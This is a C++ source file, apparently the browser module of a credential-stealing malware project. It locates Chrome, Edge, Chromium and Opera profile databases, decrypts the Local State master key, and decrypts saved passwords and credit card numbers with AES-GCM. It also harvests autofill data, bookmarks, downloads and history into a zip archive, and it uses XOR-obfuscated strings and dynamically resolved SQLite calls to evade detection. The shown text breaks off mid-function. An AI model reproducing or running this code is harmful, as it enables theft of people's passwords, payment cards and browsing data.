#include "browsers.h"

#include "../../utilities/xor/xor.h"
#include "../../utilities/tools/tools.h"
#include "../../utilities/globals/globals.h"
#include "../../utilities/zip_handle/zip_handle.h"
#include "../../utilities/directories/directories.h"

#include "../../winapi/winapi.h"

#include "../../depository/b64/b64.h"
#include "../../depository/sqlite3/sqlite3.h"
#include "../../depository/plusaes/plusaes_wrapper.hpp"
#include "../../depository/json/json.h"

#include <fstream>

browsers g_browsers;

int sqlite3_open(const char *zFilename, sqlite3 **ppDb) {

	typedef int(SQLITE_API* sqlite3open_t)(const char *zFilename, sqlite3 **ppDb);

	LPVOID to_addr = g_winapi._GetProcAddress(g_globals.sqlite_module, XOR_STRING("sqlite3_open"));
	sqlite3open_t sqlite3open = (sqlite3open_t)to_addr;
	return sqlite3open(zFilename, ppDb);
}

int SQLITE_API sqlite3_prepare_v2(sqlite3 *db, const char *zSql, int nBytes,
	sqlite3_stmt **ppStmt, const char **pzTail) {

	typedef int(SQLITE_API* sqlite3_prepare_v2_t)(sqlite3 *db, const char *zSql, int nBytes,
		sqlite3_stmt **ppStmt, const char **pzTail);

	LPVOID to_addr = g_winapi._GetProcAddress(g_globals.sqlite_module, XOR_STRING("sqlite3_prepare_v2"));
	sqlite3_prepare_v2_t sqlite3preparev2 = (sqlite3_prepare_v2_t)to_addr;
	return sqlite3preparev2(db, zSql, nBytes, ppStmt, pzTail);
}

int SQLITE_API sqlite3_step(sqlite3_stmt *pStmt) {

	typedef int(SQLITE_API* sqlite3_step_t)(sqlite3_stmt *pStmt);

	LPVOID to_addr = g_winapi._GetProcAddress(g_globals.sqlite_module, XOR_STRING("sqlite3_step"));
	sqlite3_step_t sqlite3stept = (sqlite3_step_t)to_addr;
	return sqlite3stept(pStmt);
}

const unsigned char* SQLITE_API sqlite3_column_text(sqlite3_stmt *pStmt, int i) {

	typedef const unsigned char*(SQLITE_API* sqlite3_column_text_t)(sqlite3_stmt *pStmt, int i);

	LPVOID to_addr = g_winapi._GetProcAddress(g_globals.sqlite_module, XOR_STRING("sqlite3_column_text"));
	sqlite3_column_text_t sqlite3columntext = (sqlite3_column_text_t)to_addr;
	return sqlite3columntext(pStmt, i);
}

int SQLITE_API sqlite3_finalize(sqlite3_stmt *pStmt) {

	typedef int(SQLITE_API* sqlite3_finalize_t)(sqlite3_stmt *pStmt);

	LPVOID to_addr = g_winapi._GetProcAddress(g_globals.sqlite_module, XOR_STRING("sqlite3_finalize"));
	sqlite3_finalize_t sqlite3finalize = (sqlite3_finalize_t)to_addr;
	return sqlite3finalize(pStmt);
}

int SQLITE_API sqlite3_close(sqlite3 *db) {

	typedef int(SQLITE_API* sqlite3_close_t)(sqlite3 *db);

	LPVOID to_addr = g_winapi._GetProcAddress(g_globals.sqlite_module, XOR_STRING("sqlite3_close"));
	sqlite3_close_t sqlite3close = (sqlite3_close_t)to_addr;
	return sqlite3close(db);
}

static std::string decrypt_master_key(std::string path)
{
	std::string content;

	std::ifstream f(path, std::ios::in | std::ios::binary | std::ios::ate);
	if (f.is_open()) {
		std::streamsize size = f.tellg();
		std::vector<char> _buffer(size);
		std::string buffer(_buffer.begin(), _buffer.end());
		f.seekg(0, std::ios::beg);

		if (f.read(buffer.data(), size)) {

			const char data[] = { 0x22, 0x65, 0x6E, 0x63, 0x72, 0x79, 0x70,
				0x74, 0x65, 0x64, 0x5F, 0x6B, 0x65, 0x79, 0x22, 0x3A, 0x22 };

			std::string target_str(data, sizeof(data));
			std::size_t index = buffer.find(target_str);
			std::size_t start = index + target_str.size();
			std::size_t end = buffer.find("\"", start);
			content = buffer.substr(start, end - start);
		}
		f.close();
	}

	std::string master;
	g_b64.decode(content, master);
	master = g_tools.decrypt_c32(master.substr(5, master.size() - 5));

	return master;
}

static void trim_data(std::string original_data, std::string* out_pass, std::string* out_tag, std::string* iv) {
	std::string buf;

	*iv = original_data.substr(3, 12);
	buf = original_data.substr(15, original_data.size() - 15);
	*out_tag = buf.substr(buf.size() - 16, 16);
	*out_pass = buf.substr(0, buf.size() - out_tag->size());
}

static std::string decrypt_ch(std::string local_state_path, std::string content) {
	std::string dec_buf;

	std::string key = decrypt_master_key(local_state_path);
	nk125::plusaes_wrapper aes;
	std::string data, gcm_tag, iv;

	trim_data(content, &data, &gcm_tag, &iv);
	aes.set_nonce(reinterpret_cast<unsigned char*>(iv.data()));
	dec_buf = aes.gcm_decrypt(data, key, gcm_tag);

	return dec_buf;
}

static void decrypt_chromium_credit_cards(std::string browser_name, std::string web_data_path, std::string local_state_path)
{
	static sqlite3 *sqlite3_database;
	static sqlite3_stmt *sqlite3_stmt_database;

	if (sqlite3_open(web_data_path.c_str(), &sqlite3_database) == SQLITE_OK)
	{
		if (sqlite3_prepare_v2(sqlite3_database, XOR_STRING("SELECT * FROM credit_cards"), -1, &sqlite3_stmt_database, 0) == SQLITE_OK)
		{
			while (sqlite3_step(sqlite3_stmt_database) == SQLITE_ROW)
			{
				std::string name = (const char*)sqlite3_column_text(sqlite3_stmt_database, 1);
				std::string mounth = (const char*)sqlite3_column_text(sqlite3_stmt_database, 2);
				std::string year = (const char*)sqlite3_column_text(sqlite3_stmt_database, 3);
				std::string number;

				std::string tag = g_tools.read_file(web_data_path.c_str());

				if (tag.find(XOR_STRING("v10")) || tag.find(XOR_STRING("v11")))
				{
					number = decrypt_ch(local_state_path.c_str(),
						(const char*)sqlite3_column_text(sqlite3_stmt_database, 4));
				}
				else {
					number = g_tools.decrypt_c32((const char*)sqlite3_column_text(sqlite3_stmt_database, 4));
				}

				std::string credit_card_file_name = std::string(XOR_STRING("#")) + g_tools.random_string(3, XOR_STRING("0123456789")).c_str() +
					std::string(1, ' ') + std::string(XOR_STRING("Card.txt"));

				std::stringstream ss;

				const char banner[] = {
						0x20, 0x20, 0x20, 0x20, 0x20, 0x5F, 0x5F, 0x5F, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
						0x20, 0x20, 0x20, 0x20, 0x5F, 0x20, 0x5F, 0x20, 0x5F, 0x20, 0x20, 0x20, 0x20, 0x5F, 0x5F, 0x5F,
						0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x5F, 0x20, 0x0D,
						0x0A, 0x20, 0x20, 0x20, 0x20, 0x2F, 0x20, 0x5F, 0x5F, 0x7C, 0x5F, 0x20, 0x5F, 0x20, 0x5F, 0x5F,
						0x5F, 0x20, 0x5F, 0x5F, 0x7C, 0x20, 0x28, 0x5F, 0x29, 0x20, 0x7C, 0x5F, 0x20, 0x2F, 0x20, 0x5F,
						0x5F, 0x7C, 0x5F, 0x5F, 0x20, 0x5F, 0x20, 0x5F, 0x20, 0x5F, 0x20, 0x5F, 0x5F, 0x7C, 0x20, 0x7C,
						0x0D, 0x0A, 0x20, 0x20, 0x20, 0x7C, 0x20, 0x28, 0x5F, 0x5F, 0x7C, 0x20, 0x27, 0x5F, 0x2F, 0x20,
						0x2D, 0x5F, 0x29, 0x20, 0x5F, 0x60, 0x20, 0x7C, 0x20, 0x7C, 0x20, 0x20, 0x5F, 0x7C, 0x20, 0x28,
						0x5F, 0x5F, 0x2F, 0x20, 0x5F, 0x60, 0x20, 0x7C, 0x20, 0x27, 0x5F, 0x2F, 0x20, 0x5F, 0x60, 0x20,
						0x7C, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x5C, 0x5F, 0x5F, 0x5F, 0x7C, 0x5F, 0x7C, 0x20, 0x5C,
						0x5F, 0x5F, 0x5F, 0x5C, 0x5F, 0x5F, 0x2C, 0x5F, 0x7C, 0x5F, 0x7C, 0x5C, 0x5F, 0x5F, 0x7C, 0x5C,
						0x5F, 0x5F, 0x5F, 0x5C, 0x5F, 0x5F, 0x2C, 0x5F, 0x7C, 0x5F, 0x7C, 0x20, 0x5C, 0x5F, 0x5F, 0x2C,
						0x5F, 0x7C, 0x0D, 0x0A
				};

				ss << XOR_STRING("\r\n");
				for (size_t i = 0; i < sizeof(banner) / sizeof(banner[0]); ++i) {
					ss << banner[i];
				}
				ss << XOR_STRING("\r\n");

				ss << std::string(3, ' ') << XOR_STRING("Browser name: ") << browser_name.c_str() << XOR_STRING("\r\n");
				ss << std::string(3, ' ') << XOR_STRING("Holder name: ") << name << XOR_STRING("\r\n");
				ss << std::string(3, ' ') << XOR_STRING("Mounth/Year: ") << mounth.c_str() << XOR_STRING("/") << year.c_str() << XOR_STRING("\r\n");
				ss << std::string(3, ' ') << XOR_STRING("Number: ") << number.c_str() << XOR_STRING("\r\n");

				std::string file_name = std::string(XOR_STRING("CC/")) + credit_card_file_name.c_str();
				g_zip.write_zip(file_name.c_str(), ss.str());

				g_globals.credit_cards_count++;
			}
		}

		sqlite3_finalize(sqlite3_stmt_database);
		sqlite3_close(sqlite3_database);
	}
}

static std::string decrypt_chromium_login_data(std::string browser_name, std::string login_data_path, std::string local_state_path)
{
	static sqlite3 *sqlite3_database;
	static sqlite3_stmt *sqlite3_stmt_database;

	std::stringstream ss;

	if (sqlite3_open(login_data_path.c_str(), &sqlite3_database) == SQLITE_OK)
	{
		if (sqlite3_prepare_v2(sqlite3_database, XOR_STRING("SELECT origin_url, username_value, length(password_value), password_value FROM logins"), -1, &sqlite3_stmt_database, 0) == SQLITE_OK)
		{
			while (sqlite3_step(sqlite3_stmt_database) == SQLITE_ROW)
			{
				std::string url = (const char*)sqlite3_column_text(sqlite3_stmt_database, 0);
				std::string login = (const char*)sqlite3_column_text(sqlite3_stmt_database, 1);
				std::string password;

				std::string tag = g_tools.read_file(login_data_path.c_str());

				if (tag.find(XOR_STRING("v10")) || tag.find(XOR_STRING("v11")))
				{
					password = decrypt_ch(local_state_path.c_str(),
						(const char*)sqlite3_column_text(sqlite3_stmt_database, 3));
				}
				else {
					password = g_tools.decrypt_c32((const char*)sqlite3_column_text(sqlite3_stmt_database, 3));
				}

				ss << std::string(2, ' ') << browser_name.c_str() << XOR_STRING(", ") << url.c_str() << XOR_STRING(", ") << login.c_str() << XOR_STRING(", ") << password.c_str() << XOR_STRING("\r\n");
				ss << std::string(2, ' ') << XOR_STRING("---------------------------------------------------------------------------------------------------------------") << XOR_STRING("\r\n");

				g_globals.passwords_count++;
			}
		}

		sqlite3_finalize(sqlite3_stmt_database);
		sqlite3_close(sqlite3_database);
	}

	return ss.str();
}

static std::string decrypt_chromium_autofills(std::string browser_name, std::string web_data_path, std::string local_state_path)
{
	static sqlite3 *sqlite3_database;
	static sqlite3_stmt *sqlite3_stmt_database;

	std::stringstream ss;

	if (sqlite3_open(web_data_path.c_str(), &sqlite3_database) == SQLITE_OK)
	{
		if (sqlite3_prepare_v2(sqlite3_database, XOR_STRING("SELECT * FROM autofill"), -1, &sqlite3_stmt_database, 0) == SQLITE_OK)
		{
			while (sqlite3_step(sqlite3_stmt_database) == SQLITE_ROW)
			{
				std::string name = (const char*)sqlite3_column_text(sqlite3_stmt_database, 0);
				std::string value = (const char*)sqlite3_column_text(sqlite3_stmt_database, 1);

				ss << std::string(2, ' ') << browser_name.c_str() << XOR_STRING(", ") << name.c_str() << XOR_STRING(", ") << value.c_str() << XOR_STRING("\r\n");
				ss << std::string(2, ' ') << XOR_STRING("---------------------------------------------------------------------------------------------------------------") << XOR_STRING("\r\n");

				g_globals.autofill_count++;
			}
		}

		sqlite3_finalize(sqlite3_stmt_database);
		sqlite3_close(sqlite3_database);
	}

	return ss.str();
}

static std::string decrypt_chromium_bookmarks(std::string browser_name, std::string bookmarks_path)
{
	std::string bookmarks_data_path = g_dir.get_temp() + std::string(g_tools.bookmarks_file.c_str());
	std::string bookmarks_data = g_tools.read_file(bookmarks_path.c_str());

	Json::Value json_data;
	Json::Reader json_reader;

	std::stringstream ss;

	if (json_reader.parse(bookmarks_data, json_data, true))
	{
		for (Json::Value::ArrayIndex i = 0; i != json_data[XOR_STRING("roots")][XOR_STRING("bookmark_bar")][XOR_STRING("children")].size(); i++)
		{
			const std::string name(json_data[XOR_STRING("roots")][XOR_STRING("bookmark_bar")][XOR_STRING("children")][i][XOR_STRING("name")].asString());
			const std::string type(json_data[XOR_STRING("roots")][XOR_STRING("bookmark_bar")][XOR_STRING("children")][i][XOR_STRING("type")].asString());
			const std::string url(json_data[XOR_STRING("roots")][XOR_STRING("bookmark_bar")][XOR_STRING("children")][i][XOR_STRING("url")].asString());

			ss << std::string(2, ' ') << browser_name.c_str() << XOR_STRING(", ") << name.c_str() << XOR_STRING(", ") << url.c_str() << XOR_STRING(", ") << type.c_str() << XOR_STRING("\r\n");
			ss << std::string(2, ' ') << XOR_STRING("---------------------------------------------------------------------------------------------------------------") << XOR_STRING("\r\n");

			g_globals.bookmarks_count++;
		}
	}

	return ss.str();
}

static std::string decrypt_chromium_downloads(std::string browser_name, std::string history_data_path)
{
	static sqlite3 *sqlite3_database;
	static sqlite3_stmt *sqlite3_stmt_database;

	std::stringstream ss;

	if (sqlite3_open(history_data_path.c_str(), &sqlite3_database) == SQLITE_OK)
	{
		if (sqlite3_prepare_v2(sqlite3_database, XOR_STRING("SELECT * FROM downloads"), -1, &sqlite3_stmt_database, 0) == SQLITE_OK)
		{
			while (sqlite3_step(sqlite3_stmt_database) == SQLITE_ROW)
			{
				std::string title = (const char*)sqlite3_column_text(sqlite3_stmt_database, 2);
				std::string url = (const char*)sqlite3_column_text(sqlite3_stmt_database, 18);

				ss << std::string(2, ' ') << browser_name.c_str() << XOR_STRING(", ") << title.c_str() << XOR_STRING(", ") << url.c_str() << XOR_STRING("\r\n");
				ss << std::string(2, ' ') << XOR_STRING("---------------------------------------------------------------------------------------------------------------") << XOR_STRING("\r\n");

				g_globals.downloads_count++;
			}
		}

		sqlite3_finalize(sqlite3_stmt_database);
		sqlite3_close(sqlite3_database);
	}

	return ss.str();
}

static std::string decrypt_chromium_history(std::string browser_name, std::string history_data_path)
{
	static sqlite3 *sqlite3_database;
	static sqlite3_stmt *sqlite3_stmt_database;

	std::stringstream ss;

	if (sqlite3_open(history_data_path.c_str(), &sqlite3_database) == SQLITE_OK)
	{
		if (sqlite3_prepare_v2(sqlite3_database, XOR_STRING("SELECT * FROM urls"), -1, &sqlite3_stmt_database, 0) == SQLITE_OK)
		{
			while (sqlite3_step(sqlite3_stmt_database) == SQLITE_ROW)
			{
				std::string url = (const char*)sqlite3_column_text(sqlite3_stmt_database, 1);
				std::string title = (const char*)sqlite3_column_text(sqlite3_stmt_database, 2);

				ss << std::string(2, ' ') << browser_name.c_str() << XOR_STRING(", ") << title.c_str() << XOR_STRING(", ") << url.c_str() << XOR_STRING("\r\n");
				ss << std::string(2, ' ') << XOR_STRING("---------------------------------------------------------------------------------------------------------------") << XOR_STRING("\r\n");

				g_globals.history_count++;
			}
		}

		sqlite3_finalize(sqlite3_stmt_database);
		sqlite3_close(sqlite3_database);
	}

	return ss.str();
}

void browsers::get_credit_cards()
{
	std::string chrome_dir = g_dir.get_local_appdata() + std::string(XOR_STRING("Google\\Chrome\\"));
	std::string microsoft_edge_dir = g_dir.get_local_appdata() + std::string(XOR_STRING("Microsoft\\Edge\\"));
	std::string chromium_dir = g_dir.get_local_appdata() + std::string(XOR_STRING("Chromium\\"));
	std::string opera_dir = g_dir.get_roaming_appdata() + std::string(XOR_STRING("Opera Software\\Opera Stable\\"));

	if (g_tools.check_directory(chrome_dir.c_str()) == DIR_FOUNDED) {
		std::string chrome_web_data = chrome_dir.c_str() + std::string(XOR_STRING("User Data\\Default\\Web Data"));
		std::string chrome_local_state = chrome_dir.c_str() + std::string(XOR_STRING("User Data\\Local State"));

		if (g_tools.check_directory(chrome_web_data.c_str()) == FILE_FOUNDED
			&& g_tools.check_directory(chrome_local_state.c_str()) == FILE_FOUNDED)
		{
			decrypt_chromium_credit_cards(XOR_STRING("Google Chrome"),
				chrome_web_data.c_str(), chrome_local_state.c_str());
		}
	}

	if (g_tools.check_directory(microsoft_edge_dir.c_str()) == DIR_FOUNDED)
	{
		std::string microsoft_edge_web_data = microsoft_edge_dir.c_str() + std::string(XOR_STRING("User Data\\Default\\Web Data"));
		std::string microsoft_edge_local_state = microsoft_edge_dir.c_str() + std::string(XOR_STRING("User Data\\Local State"));

		if (g_tools.check_directory(microsoft_edge_web_data.c_str()) == FILE_FOUNDED
			&& g_tools.check_directory(microsoft_edge_local_state.c_str()) == FILE_FOUNDED) {

			decrypt_chromium_credit_cards(XOR_STRING("Microsoft Edge"),
				microsoft_edge_web_data.c_str(), microsoft_edge_local_state.c_str());
		}
	}

	if (g_tools.check_directory(chromium_dir.c_str()) == DIR_FOUNDED) {
		std::string chromium_web_data = chromium_dir.c_str() + std::string(XOR_STRING("User Data\\Default\\Web Data"));
		std::string chromium_local_state = chromium_dir.c_str() + std::string(XOR_STRING("User Data\\Local State"));

		if (g_tools.check_directory(chromium_web_data.c_str()) == FILE_FOUNDED
			&& g_tools.check_directory(chromium_local_state.c_str()) == FILE_FOUNDED)
		{
			decrypt_chromium_credit_cards(XOR_STRING("Based on Chromium"),
				chromium_web_data.c_str(), chromium_local_state.c_str());
		}
	}

	if (g_tools.check_directory(opera_dir.c_str()) == DIR_FOUNDED) {
		std::string opera_web_data = opera_dir.c_str() + std::string(XOR_STRING("Web Data"));
		std::string opera_local_state = opera_dir.c_str() + std::string(XOR_STRING("Local State"));

		if (g_tools.check_directory(opera_web_data.c_str()) == FILE_FOUNDED
			&& g_tools.check_directory(opera_local_state.c_str()) == FILE_FOUNDED)
		{
			decrypt_chromium_credit_cards(XOR_STRING("Opera Stable"),
				opera_web_data.c_str(), opera_local_state.c_str());
		}
	}
}

void browsers::get_passwords()
{
	std::string chrome_dir = g_dir.get_local_appdata() + std::string(XOR_STRING("Google\\Chrome\\"));
	std::string microsoft_edge_dir = g_dir.get_local_appdata() + std::string(XOR_STRING("Microsoft\\Edge\\"));
	std::string opera_dir = g_dir.get_roaming_appdata() + std::string(XOR_STRING("Opera Software\\Opera Stable\\"));

	std::stringstream ss;

	const char banner[] = {
			0x20, 0x20, 0x20, 0x5F, 0x5F, 0x5F, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
			0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
			0x20, 0x20, 0x20, 0x20, 0x5F, 0x20, 0x20, 0x20, 0x20, 0x0D, 0x0A, 0x20, 0x20, 0x7C, 0x20, 0x5F,
			0x20, 0x5C, 0x5F, 0x5F, 0x20, 0x5F, 0x20, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x20, 0x5F,
			0x5F, 0x20, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x20, 0x5F, 0x20, 0x5F, 0x20, 0x5F, 0x5F, 0x7C, 0x20,
			0x7C, 0x5F, 0x5F, 0x5F, 0x0D, 0x0A, 0x20, 0x20, 0x7C, 0x20, 0x20, 0x5F, 0x2F, 0x20, 0x5F, 0x60,
			0x20, 0x28, 0x5F, 0x2D, 0x3C, 0x5F, 0x2D, 0x3C, 0x20, 0x56, 0x20, 0x20, 0x56, 0x20, 0x2F, 0x20,
			0x5F, 0x20, 0x5C, 0x20, 0x27, 0x5F, 0x2F, 0x20, 0x5F, 0x60, 0x20, 0x28, 0x5F, 0x2D, 0x3C, 0x0D,
			0x0A, 0x20, 0x20, 0x7C, 0x5F, 0x7C, 0x20, 0x5C, 0x5F, 0x5F, 0x2C, 0x5F, 0x2F, 0x5F, 0x5F, 0x2F,
			0x5F, 0x5F, 0x2F, 0x5C, 0x5F, 0x2F, 0x5C, 0x5F, 0x2F, 0x5C, 0x5F, 0x5F, 0x5F, 0x2F, 0x5F, 0x7C,
			0x20, 0x5C, 0x5F, 0x5F, 0x2C, 0x5F, 0x2F, 0x5F, 0x5F, 0x2F, 0x0D, 0x0A, 0x0D, 0x0A, 0x20, 0x20,
			0x42, 0x72, 0x6F, 0x77, 0x73, 0x65, 0x72, 0x20, 0x6E, 0x61, 0x6D, 0x65, 0x2C, 0x20, 0x55, 0x72,
			0x6C, 0x2C, 0x20, 0x4C, 0x6F, 0x67, 0x69, 0x6E, 0x2C, 0x20, 0x50, 0x61, 0x73, 0x73, 0x77, 0x6F,
			0x72, 0x64, 0x0D, 0x0A, 0x20, 0x20, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
			0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
			0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
			0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
			0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
			0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
			0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
			0x2D, 0x2D, 0x2D, 0x2D, 0x2D
	};

	ss << XOR_STRING("\r\n");
	for (size_t i = 0; i < sizeof(banner) / sizeof(banner[0]); ++i) {
		ss << banner[i];
	}
	ss << XOR_STRING("\r\n");

	if (g_tools.check_directory(chrome_dir.c_str()) == DIR_FOUNDED)
	{
		std::string chrome_login_data = chrome_dir.c_str() + std::string(XOR_STRING("User Data\\Default\\Login Data"));
		std::string chrome_local_state = chrome_dir.c_str() + std::string(XOR_STRING("User Data\\Local State"));

		if (g_tools.check_directory(chrome_login_data.c_str()) == FILE_FOUNDED
			&& g_tools.check_directory(chrome_local_state.c_str()) == FILE_FOUNDED) {
			ss << decrypt_chromium_login_data(XOR_STRING("Google Chrome"), chrome_login_data.c_str(),
				chrome_local_state.c_str());
		}
	}

	if (g_tools.check_directory(microsoft_edge_dir.c_str()) == DIR_FOUNDED)
	{
		std::string microsoft_edge_login_data = microsoft_edge_dir.c_str() + std::string(XOR_STRING("User Data\\Default\\Login Data"));
		std::string microsoft_edge_local_state = microsoft_edge_dir.c_str() + std::string(XOR_STRING("User Data\\Local State"));

		if (g_tools.check_directory(microsoft_edge_login_data.c_str()) == FILE_FOUNDED
			&& g_tools.check_directory(microsoft_edge_local_state.c_str()) == FILE_FOUNDED) {
			ss << decrypt_chromium_login_data(XOR_STRING("Microsoft Edge"), microsoft_edge_login_data.c_str(),
				microsoft_edge_local_state.c_str());
		}
	}

	if (g_tools.check_directory(opera_dir.c_str()) == DIR_FOUNDED)
	{
		std::string opera_login_data = opera_dir.c_str() + std::string(XOR_STRING("Login Data"));
		std::string opera_local_state = opera_dir.c_str() + std::string(XOR_STRING("Local State"));

		if (g_tools.check_directory(opera_login_data.c_str()) == FILE_FOUNDED
			&& g_tools.check_directory(opera_local_state.c_str()) == FILE_FOUNDED) {
			ss << decrypt_chromium_login_data(XOR_STRING("Opera Stable"), opera_login_data.c_str(),
				opera_local_state.c_str());
		}
	}

	ss << std::string(2, ' ') << XOR_STRING(WATERMARK) << XOR_STRING("\r\n");

	if (g_globals.passwords_count < 0)
		return;

	std::string file_name = std::string(XOR_STRING("Browsers/")) + g_tools.passwords_file.c_str();
	g_zip.write_zip(file_name.c_str(), ss.str());
}

void browsers::get_autofills()
{
	std::string chrome_dir = g_dir.get_local_appdata() + std::string(XOR_STRING("Google\\Chrome\\"));
	std::string microsoft_edge_dir = g_dir.get_local_appdata() + std::string(XOR_STRING("Microsoft\\Edge\\"));
	std::string chromium_dir = g_dir.get_local_appdata() + std::string(XOR_STRING("Chromium\\"));
	std::string opera_dir = g_dir.get_roaming_appdata() + std::string(XOR_STRING("Opera Software\\Opera Stable\\"));

	std::stringstream ss;

	const char banner[] = {
		0x20, 0x20, 0x20, 0x20, 0x20, 0x5F, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x5F, 0x20, 0x20,
		0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x5F, 0x5F, 0x20, 0x5F, 0x20, 0x5F, 0x20, 0x5F, 0x20, 0x0D,
		0x0A, 0x20, 0x20, 0x20, 0x20, 0x2F, 0x5F, 0x5C, 0x20, 0x5F, 0x20, 0x20, 0x5F, 0x7C, 0x20, 0x7C,
		0x5F, 0x20, 0x5F, 0x5F, 0x5F, 0x20, 0x2F, 0x20, 0x5F, 0x28, 0x5F, 0x29, 0x20, 0x7C, 0x20, 0x7C,
		0x0D, 0x0A, 0x20, 0x20, 0x20, 0x2F, 0x20, 0x5F, 0x20, 0x5C, 0x20, 0x7C, 0x7C, 0x20, 0x7C, 0x20,
		0x20, 0x5F, 0x2F, 0x20, 0x5F, 0x20, 0x5C, 0x20, 0x20, 0x5F, 0x7C, 0x20, 0x7C, 0x20, 0x7C, 0x20,
		0x7C, 0x0D, 0x0A, 0x20, 0x20, 0x2F, 0x5F, 0x2F, 0x20, 0x5C, 0x5F, 0x5C, 0x5F, 0x2C, 0x5F, 0x7C,
		0x5C, 0x5F, 0x5F, 0x5C, 0x5F, 0x5F, 0x5F, 0x2F, 0x5F, 0x7C, 0x20, 0x7C, 0x5F, 0x7C, 0x5F, 0x7C,
		0x5F, 0x7C, 0x0D, 0x0A, 0x0D, 0x0A, 0x20, 0x20, 0x42, 0x72, 0x6F, 0x77, 0x73, 0x65, 0x72, 0x20,
		0x6E, 0x61, 0x6D, 0x65, 0x2C, 0x20, 0x4E, 0x61, 0x6D, 0x65, 0x2C, 0x20, 0x55, 0x72, 0x6C, 0x2C,
		0x20, 0x54, 0x79, 0x70, 0x65, 0x0D, 0x0A, 0x20, 0x20, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
		0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
		0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
		0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
		0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
		0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
		0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
		0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D
	};

	ss << XOR_STRING("\r\n");
	for (size_t i = 0; i < sizeof(banner) / sizeof(banner[0]); ++i) {
		ss << banner[i];
	}
	ss << XOR_STRING("\r\n");

	if (g_tools.check_directory(chrome_dir.c_str()) == DIR_FOUNDED)
	{
		std::string chrome_web_data = chrome_dir.c_str() + std::string(XOR_STRING("User Data\\Default\\Web Data"));
		std::string chrome_local_state = chrome_dir.c_str() + std::string(XOR_STRING("User Data\\Local State"));

		if (g_tools.check_directory(chrome_web_data.c_str()) == FILE_FOUNDED
			&& g_tools.check_directory(chrome_local_state.c_str()) == FILE_FOUNDED) {
			ss << decrypt_chromium_autofills(XOR_STRING("Google Chrome"), chrome_web_data.c_str(),
				chrome_local_state.c_str());
		}
	}

	if (g_tools.check_directory(microsoft_edge_dir.c_str()) == DIR_FOUNDED)
	{
		std::string microsoft_edge_web_data = microsoft_edge_dir.c_str() + std::string(XOR_STRING("User Data\\Default\\Web Data"));
		std::string microsoft_edge_local_state = microsoft_edge_dir.c_str() + std::string(XOR_STRING("User Data\\Local State"));

		if (g_tools.check_directory(microsoft_edge_web_data.c_str()) == FILE_FOUNDED
			&& g_tools.check_directory(microsoft_edge_local_state.c_str()) == FILE_FOUNDED) {
			ss << decrypt_chromium_autofills(XOR_STRING("Microsoft Edge"), microsoft_edge_web_data.c_str(),
				microsoft_edge_local_state.c_str());
		}
	}

	if (g_tools.check_directory(chromium_dir.c_str()) == DIR_FOUNDED)
	{
		std::string chromium_web_data = chromium_dir.c_str() + std::string(XOR_STRING("User Data\\Default\\Web Data"));
		std::string chromium_local_state = chromium_dir.c_str() + std::string(XOR_STRING("User Data\\Local State"));

		if (g_tools.check_directory(chromium_web_data.c_str()) == FILE_FOUNDED
			&& g_tools.check_directory(chromium_local_state.c_str()) == FILE_FOUNDED) {
			ss << decrypt_chromium_autofills(XOR_STRING("Based on Chromium"), chromium_web_data.c_str(),
				chromium_local_state.c_str());
		}
	}

	if (g_tools.check_directory(opera_dir.c_str()) == DIR_FOUNDED)
	{
		std::string opera_web_data = opera_dir.c_str() + std::string(XOR_STRING("Web Data"));
		std::string opera_local_state = opera_dir.c_str() + std::string(XOR_STRING("Local State"));

